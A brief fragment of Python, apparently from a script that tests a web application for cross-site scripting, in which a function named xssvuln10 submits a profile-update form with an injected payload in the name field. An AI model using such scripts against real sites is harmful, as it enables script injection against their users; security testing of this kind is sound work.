...
def xssvuln10():
 ...
 #  print(r.headers)
    ...
    multipart_form_data = {'username': (None, user), 'name':(None, payload), 'currentpassword':(None, password),'newpassword':(None, password), 'about':(None, 'im not trying to hack you'), 'photo': ('1598703889159.png', open('venv/1598703889159.png', 'rb')) }
